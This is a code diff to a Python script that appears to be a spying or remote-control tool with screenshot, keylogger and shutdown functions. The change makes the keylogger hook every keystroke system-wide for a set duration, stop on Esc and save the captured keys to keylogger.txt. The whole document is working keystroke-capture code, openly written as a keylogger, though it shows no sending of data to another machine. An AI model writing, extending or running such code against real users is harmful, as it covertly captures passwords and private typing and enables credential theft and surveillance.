@@ -4,6 +4,7 @@ import os
 import logging
 import keyboard
 import cv2 as cv
+import time
 from pynput.keyboard import Listener
 from PIL import ImageGrab
 from PIL import Image
@@ -39,17 +40,28 @@ def screenshot():
     screenshotImage.save(os.path.join(curDir, "screenshot.png"))
     
     
-def keylogger():
+def keylogger(duration):
     recorded_keys = []
+    escape = False
     def on_key_event(e):
+        nonlocal escape
         if e.event_type == keyboard.KEY_UP:
             key = e.name
-            recorded_keys.append(key)
+            if key == "esc":
+                escape = True
+            else:
+                recorded_keys.append(key)
 
     keyboard.hook(on_key_event)
-    keyboard.wait("esc")
-
-    return recorded_keys
+    start = time.time()
+    while(time.time() - start) < duration and not escape:
+        pass
+    
+    keyboard.unhook_all()
+    
+    with open("keylogger.txt", "w") as file:
+        for kl in recorded_keys:
+            file.write(kl)
 
 
 def shutdown():
